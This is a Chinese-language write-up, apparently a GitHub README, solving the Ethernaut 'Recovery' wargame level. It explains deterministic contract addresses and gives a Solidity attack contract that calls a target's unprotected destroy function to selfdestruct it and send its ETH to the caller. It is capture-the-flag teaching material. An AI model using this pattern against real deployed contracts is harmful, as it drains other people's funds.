# Ethernaut-Recovery
Ethernaut Recovery解題思路

<img width="701" height="741" alt="image" src="https://github.com/user-attachments/assets/80e90069-1260-4581-aee0-36b66c122f94" />

***這題是關於解釋生成合約的地址是確定性的，由 keccak256(address, nonce) 計算得出***

其中 address 是代幣工廠合約的地址（或創建以太坊交易的地址），nonce 是該合約創建了第幾個的合約數目（或常規交易在用的隨機數nonce值）。

但其實還有更快的辦法就是到Sepolia etherscan就可以找到生成合約

找到之後就可以利用攻擊合約把找到的生成合約帶進去然後呼叫selfdestruct(_to)，這個意思就是說無條件把該合約裡面的eth餘額通通轉到_to這個合約裡面

所以只要把＿to改成msg.sender就可以找回遺失的eth

以下攻擊合約程式碼：

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface ISimpleToken {
        function destroy(address payable _to) external ;
    }

    contract hack{
        uint256 balance;
        ISimpleToken public target;
    constructor(address _target){
        target=ISimpleToken(_target);
    }
    function withdraw()public payable {
        target.destroy(payable(msg.sender));
     }
    function get()public view returns(uint256) {
        return address(this).balance;
    }
    }

